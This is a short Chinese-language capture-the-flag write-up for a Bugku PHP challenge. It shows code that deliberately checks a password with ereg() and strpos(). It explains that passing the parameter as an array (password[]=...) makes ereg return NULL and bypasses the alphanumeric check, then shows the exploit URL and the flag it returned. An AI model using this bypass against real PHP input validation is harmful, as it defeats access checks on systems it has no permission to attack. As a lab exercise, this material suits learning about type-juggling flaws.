# 数组返回NULL绕过



> ## 数组返回NULL绕过
>
> ### 50
>
> 
>
> <http://123.206.87.240:9009/19.php>
>
> <?php
> $flag = "flag";
>
> if (isset ($_GET['password'])) {
> if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE)
> echo 'You password must be alphanumeric';
> else if (strpos ($_GET['password'], '--') !== FALSE)
> die('Flag: ' . $flag);
> else
> echo 'Invalid password';
> }
> ?>



## 1.php不能处理数组

根据 ` if (strpos ($_GET['password'], '--') !== FALSE)`

知道password一定有'--'

开始构造 %2d 但是过不了，

根据题目暗示和php特性

可以传一个数组绕过判断

`http://123.206.87.240:9009/19.php?password[]=sad%2d%2d`

`Flag: flag{ctf-bugku-ad-2131212}`



参考 [strpos()](http://www.w3school.com.cn/php/func_string_strpos.asp)

> strpos() 函数查找字符串在另一字符串中第一次出现的位置。
>
> **注释：**strpos() 函数对大小写敏感。

